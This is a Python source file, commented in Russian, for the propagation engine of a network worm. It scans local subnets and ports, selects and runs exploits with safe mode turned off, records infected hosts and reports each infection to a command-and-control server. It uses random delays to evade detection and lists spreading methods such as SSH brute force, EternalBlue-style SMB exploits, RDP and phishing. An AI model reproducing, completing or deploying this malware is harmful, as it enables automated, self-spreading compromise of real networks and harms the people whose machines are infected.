import socket
import subprocess
import random
import time
import logging
import ipaddress
import threading
import queue
from typing import List, Dict, Any, Optional, Union, Set

# Импортируем модули для эксплуатации
from src.exploit_engine import ExploitEngine
from src.vulnerability_scanner import VulnerabilityScanner
from src.exploit_manager import ExploitManager
from src.comms.comms import send_c2_data
from queue import Queue, Empty

# Настройка логирования
logger = logging.getLogger('WormPropagation')

# Доступные техники распространения
PROPAGATION_TECHNIQUES = {
    'ssh_brute': 'SSH Brute Force',
    'smb_exploit': 'SMB Exploits (e.g. EternalBlue)',
    'web_exploit': 'Web Application Exploits',
    'rdp_exploit': 'RDP Exploits',
    'credential_reuse': 'Credential Reuse',
    'usb_spread': 'USB Spreading',
    'shared_folders': 'Shared Folders',
    'email_phishing': 'Email Phishing'
}

class PropagationEngine:
    """Основной класс для управления распространением червя"""
    
    def __init__(self):
        self.exploit_engine = ExploitEngine(safe_mode=False)
        self.vulnerability_scanner = VulnerabilityScanner()
        self.exploit_manager = ExploitManager()
        
        # Результаты сканирования - кэшируем, чтобы не сканировать одно и то же
        self.scan_cache = {
            'networks': set(),       # Просканированные сети
            'hosts': set(),          # Просканированные хосты
            'vulnerable_hosts': {},  # Хосты с уязвимостями {host: [vulns]}
            'infected_hosts': set()  # Успешно зараженные хосты
        }
        
        # Настройки распространения по умолчанию
        self.config = {
            'concurrency': 5,        # Количество одновременных потоков
            'timeout': 3,            # Таймаут для подключений (в секундах)
            'random_delay': True,    # Использовать случайные задержки
            'preferred_techniques': ['ssh_brute', 'smb_exploit', 'web_exploit'], # Приоритетные техники
            'max_attempts_per_host': 3  # Максимальное количество попыток на хост
        }
        
        # Каналы связи с другими модулями
        self.command_queue = queue.Queue()  # Очередь команд от C2
        
        logger.info("PropagationEngine initialized")
    
    def autodetect_networks(self) -> List[str]:
        """Автоматически определяет локальные сети"""
        logger.info("Autodetecting local networks")
        networks = []
        
        # Получаем информацию о сетевых интерфейсах
        try:
            # Получаем IP-адреса всех интерфейсов
            hostname = socket.gethostname()
            iface_addrs = socket.getaddrinfo(hostname, None)
            
            for addr in iface_addrs:
                ip = addr[4][0]
                # Фильтруем только IPv4 и не localhost
                if '.' in ip and not ip.startswith('127.'):
                    # Создаем маску подсети /24
                    network = '.'.join(ip.split('.')[:3]) + '.0/24'
                    networks.append(network)
        except Exception as e:
            logger.error(f"Error autodetecting networks: {e}", exc_info=True)
        
        # Если не удалось определить сети, используем стандартные
        if not networks:
            networks = ['192.168.1.0/24', '10.0.0.0/24', '172.16.0.0/24']
            
        logger.info(f"Detected networks: {networks}")
        return networks
    
    def scan_network(self, subnet: str, quick: bool = True) -> List[str]:
        """Сканирует сеть для поиска живых хостов"""
        logger.info(f"Scanning network {subnet}")
        
        # Проверяем, не сканировали ли мы уже эту сеть
        if subnet in self.scan_cache['networks'] and quick:
            logger.debug(f"Using cached results for network {subnet}")
            # Фильтруем хосты, которые принадлежат этой сети
            return [host for host in self.scan_cache['hosts'] 
                   if ipaddress.ip_address(host) in ipaddress.ip_network(subnet)]
        
        # Добавляем сеть в кэш
        self.scan_cache['networks'].add(subnet)
        
        live_hosts = []
        # Используем threading для параллельного сканирования
        threads = []
        host_queue = queue.Queue()
        result_lock = threading.Lock()
        
        # Наполняем очередь хостами
        for ip in ipaddress.IPv4Network(subnet):
            host_queue.put(str(ip))
        
        def scan_worker():
            while not host_queue.empty():
                try:
                    ip_str = host_queue.get(block=False)
                    # Случайная задержка для усложнения обнаружения
                    if self.config['random_delay']:
                        time.sleep(random.uniform(0, 0.5))
                        
                    # Ping или проверка портов
                    if quick:
                        # Быстрая проверка через сокет
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(self.config['timeout'])
                        # Проверяем обычные порты
                        common_ports = [80, 443, 22, 445]
                        is_live = False
                        for port in common_ports:
                            try:
                                result = s.connect_ex((ip_str, port))
                                if result == 0:
                                    is_live = True
                                    break
                            except:
                                continue
                        s.close()
                    else:
                        # Полный ping
                        try:
                            res = subprocess.run(["ping", "-c", "1", "-W", "1", ip_str], 
                                                stdout=subprocess.DEVNULL,
                                                stderr=subprocess.DEVNULL)
                            is_live = (res.returncode == 0)
                        except:
                            is_live = False
                    
                    if is_live:
                        with result_lock:
                            live_hosts.append(ip_str)
                            self.scan_cache['hosts'].add(ip_str)
                except queue.Empty:
                    break
                except Exception as e:
                    logger.debug(f"Error scanning {ip_str}: {e}")
                finally:
                    host_queue.task_done()
        
        # Запускаем потоки
        for _ in range(min(self.config['concurrency'], 100)):
            t = threading.Thread(target=scan_worker)
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Ждем завершения всех потоков
        for t in threads:
            t.join()
            
        logger.info(f"Found {len(live_hosts)} live hosts in {subnet}")
        return live_hosts
    
    def scan_ports(self, host: str, ports: Optional[List[int]] = None) -> Dict[int, str]:
        """Сканирует порты на указанном хосте"""
        logger.debug(f"Scanning ports on {host}")
        
        if ports is None:
            # Список общих портов
            ports = [21, 22, 23, 25, 53, 80, 88, 110, 111, 135, 139, 143, 389, 
                    443, 445, 465, 587, 636, 1433, 1521, 3306, 3389, 5432, 5900, 
                    5985, 5986, 8080, 8443]
        
        open_ports = {}
        for port in ports:
            try:
                # Случайная задержка
                if self.config['random_delay']:
                    time.sleep(random.uniform(0, 0.2))
                    
                with socket.create_connection((host, port), timeout=self.config['timeout']):
                    # Определяем сервис
                    service = self._detect_service(host, port)
                    open_ports[port] = service
            except Exception:
                continue
                
        return open_ports
    
    def _detect_service(self, host: str, port: int) -> str:
        """Пытается определить сервис на порту"""
        # Базовое определение по номеру порта
        common_services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp', 
            53: 'dns', 80: 'http', 88: 'kerberos', 110: 'pop3',
            111: 'rpcbind', 135: 'msrpc', 139: 'netbios-ssn', 143: 'imap',
            389: 'ldap', 443: 'https', 445: 'microsoft-ds', 465: 'smtps',
            587: 'submission', 636: 'ldaps', 1433: 'ms-sql-s', 1521: 'oracle',
            3306: 'mysql', 3389: 'ms-wbt-server', 5432: 'postgresql',
            5900: 'vnc', 5985: 'wsman', 5986: 'wsmans', 8080: 'http-proxy',
            8443: 'https-alt'
        }
        
        service = common_services.get(port, 'unknown')
        
        # Для более точного определения можно использовать banner grabbing
        # TODO: Реализовать banner grabbing для более точного определения
        
        return service
    
    def identify_vulnerabilities(self, host: str, ports: Dict[int, str]) -> List[Dict]:
        """Идентифицирует уязвимости на хосте с открытыми портами"""
        logger.info(f"Scanning vulnerabilities on {host}")
        vulnerabilities = []
        
        # Отправляем хост и порты в сканер уязвимостей
        for port, service in ports.items():
            # Сканируем уязвимости для порта
            port_vulns = self.vulnerability_scanner.scan_port(host, port, service)
            if port_vulns:
                vulnerabilities.extend(port_vulns)
        
        # Добавляем хост и его уязвимости в кэш
        if vulnerabilities:
            self.scan_cache['vulnerable_hosts'][host] = vulnerabilities
            
        logger.info(f"Found {len(vulnerabilities)} vulnerabilities on {host}")
        return vulnerabilities
    
    def select_exploits(self, host: str, vulnerabilities: List[Dict]) -> List[Dict]:
        """Выбирает подходящие эксплойты для найденных уязвимостей"""
        logger.info(f"Selecting exploits for {host}")
        exploits = []
        
        for vuln in vulnerabilities:
            # Ищем эксплойты для уязвимости
            vuln_exploits = self.exploit_manager.find_exploits(vuln['vuln_id'])
            
            if vuln_exploits:
                # Выбираем наиболее перспективные эксплойты
                for exploit in vuln_exploits:
                    exploits.append({
                        'exploit_id': exploit['id'],
                        'vuln_id': vuln['vuln_id'],
                        'host': host,
                        'port': vuln['port'],
                        'success_rate': exploit.get('success_rate', 0.5),
                        'payload': exploit.get('payload', 'generic_payload')
                    })
        
        # Сортируем эксплойты по вероятности успеха
        exploits.sort(key=lambda x: x['success_rate'], reverse=True)
        
        logger.info(f"Selected {len(exploits)} exploits for {host}")
        return exploits
    
    def execute_exploits(self, exploits: List[Dict]) -> Dict[str, bool]:
        """Выполняет выбранные эксплойты"""
        logger.info(f"Executing {len(exploits)} exploits")
        results = {}
        
        for exploit in exploits:
            host = exploit['host']
            
            # Пропускаем, если хост уже заражен
            if host in self.scan_cache['infected_hosts']:
                logger.debug(f"Skipping already infected host {host}")
                results[host] = True
                continue
                
            # Выполняем эксплойт
            logger.info(f"Running exploit {exploit['exploit_id']} against {host}:{exploit['port']}")
            try:
                success = self.exploit_engine.run_exploit(
                    exploit['exploit_id'], 
                    host, 
                    exploit['port'],
                    payload=exploit['payload']
                )
                
                # Записываем результат
                results[host] = success
                
                # Если успешно, добавляем хост в список зараженных
                if success:
                    logger.info(f"Successfully infected {host}")
                    self.scan_cache['infected_hosts'].add(host)
                    
                    # Отправляем отчет на C2
                    self._report_infection(host, exploit)
                    
                    # Устанавливаем случайную задержку после успешной эксплуатации
                    if self.config['random_delay']:
                        time.sleep(random.uniform(1, 5))
                
            except Exception as e:
                logger.error(f"Error executing exploit {exploit['exploit_id']} on {host}: {e}", exc_info=True)
                results[host] = False
                
        return results
    
    def _report_infection(self, host: str, exploit: Dict):
        """Отправляет отчет об успешной инфекции на C2"""
        report = {
            'type': 'infection',
            'timestamp': time.time(),
            'host': host,
            'exploit': exploit['exploit_id'],
            'vuln_id': exploit['vuln_id'],
            'port': exploit['port']
        }
        send_c2_data(report)
    
    def propagate_targeted(self, targets: List[str], techniques: Optional[List[str]] = None) -> Dict:
        """Выполняет целевое распространение на указанные хосты с выбранными техниками"""
        logger.info(f"Starting targeted propagation to {len(targets)} hosts")
        
        if not techniques:
            techniques = self.config['preferred_techniques']
            
        results = {
            'timestamp': time.time(),
            'targets': targets,
            'techniques': techniques,
            'scanned': [],
            'vulnerable': [],
            'infected': [],
            'failed': []
        }
        
        for target in targets:
            logger.info(f"Targeting host {target}")
            
            # Проверяем живость хоста
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.config['timeout'])
                live = False
                
                # Проверяем общие порты в зависимости от выбранных техник
                ports_to_check = []
                if 'ssh_brute' in techniques:
                    ports_to_check.append(22)
                if 'smb_exploit' in techniques:
                    ports_to_check.append(445)
                if 'web_exploit' in techniques:
                    ports_to_check.extend([80, 443, 8080, 8443])
                if 'rdp_exploit' in techniques:
                    ports_to_check.append(3389)
                
                # Если нет специфичных портов, проверяем общие
                if not ports_to_check:
                    ports_to_check = [80, 22, 445, 3389]
                
                for port in ports_to_check:
                    try:
                        result = s.connect_ex((target, port))
                        if result == 0:
                            live = True
                            break
                    except:
                        continue
                s.close()
                
                if not live:
                    logger.info(f"Target {target} is not responding")
                    results['failed'].append(target)
                    continue
                
                # Добавляем в список просканированных
                results['scanned'].append(target)
                
                # Сканируем порты
                open_ports = self.scan_ports(target)
                if not open_ports:
                    logger.info(f"No open ports found on {target}")
                    results['failed'].append(target)
                    continue
                
                # Ищем уязвимости
                vulnerabilities = self.identify_vulnerabilities(target, open_ports)
                if not vulnerabilities:
                    logger.info(f"No vulnerabilities found on {target}")
                    results['failed'].append(target)
                    continue
                
                # Добавляем в список уязвимых
                results['vulnerable'].append(target)
                
                # Выбираем эксплойты
                exploits = self.select_exploits(target, vulnerabilities)
                if not exploits:
                    logger.info(f"No suitable exploits for {target}")
                    results['failed'].append(target)
                    continue
                
                # Выполняем эксплойты
                exploit_results = self.execute_exploits([exploits[0]])  # Берем самый перспективный эксплойт
                
                if exploit_results.get(target, False):
                    results['infected'].append(target)
                else:
                    results['failed'].append(target)
                
            except Exception as e:
                logger.error(f"Error propagating to {target}: {e}", exc_info=True)
                results['failed'].append(target)
        
        logger.info(f"Targeted propagation completed: {len(results['infected'])} infected, {len(results['failed'])} failed")
        return results
                
# Глобальный экземпляр для использования в функциях
propagation_engine = PropagationEngine()

def propagate(max_targets: int = 10) -> Dict:
    """Основная функция распространения червя"""
    logger.info(f"Starting propagation wave (max_targets={max_targets})")
    
    results = {
        'timestamp': time.time(),
        'scanned': [],
        'vulnerable': [],
        'infected': [],
        'failed': []
    }
    
    # Автоопределение локальных сетей
    subnets = propagation_engine.autodetect_networks()
    
    # Ограничиваем количество сканируемых хостов
    hosts_to_scan = []
    for subnet in subnets:
        # Сканируем живые хосты в сети
        subnet_hosts = propagation_engine.scan_network(subnet)
        hosts_to_scan.extend(subnet_hosts)
        
        # Если достигли лимита, прерываем
        if len(hosts_to_scan) >= max_targets:
            hosts_to_scan = hosts_to_scan[:max_targets]
            break
    
    # Добавляем в результаты
    results['scanned'] = hosts_to_scan
    
    # Для каждого хоста
    for host in hosts_to_scan:
        # Пропускаем, если хост уже заражен
        if host in propagation_engine.scan_cache['infected_hosts']:
            continue
            
        # Сканируем порты
        open_ports = propagation_engine.scan_ports(host)
        if not open_ports:
            results['failed'].append(host)
            continue
        
        # Ищем уязвимости
        vulnerabilities = propagation_engine.identify_vulnerabilities(host, open_ports)
        if not vulnerabilities:
            results['failed'].append(host)
            continue
            
        # Добавляем в список уязвимых
        results['vulnerable'].append(host)
        
        # Выбираем эксплойты
        exploits = propagation_engine.select_exploits(host, vulnerabilities)
        if not exploits:
            results['failed'].append(host)
            continue
            
        # Выполняем эксплойты
        exploit_results = propagation_engine.execute_exploits([exploits[0]])  # Берем самый перспективный эксплойт
        
        if exploit_results.get(host, False):
            results['infected'].append(host)
        else:
            results['failed'].append(host)
    
    logger.info(f"Propagation wave completed: {len(results['infected'])} infected, {len(results['failed'])} failed")
    return results

def propagate_targeted(targets: List[str], techniques: Optional[List[str]] = None) -> Dict:
    """Выполняет целевое распространение на указанные хосты"""
    return propagation_engine.propagate_targeted(targets, techniques)
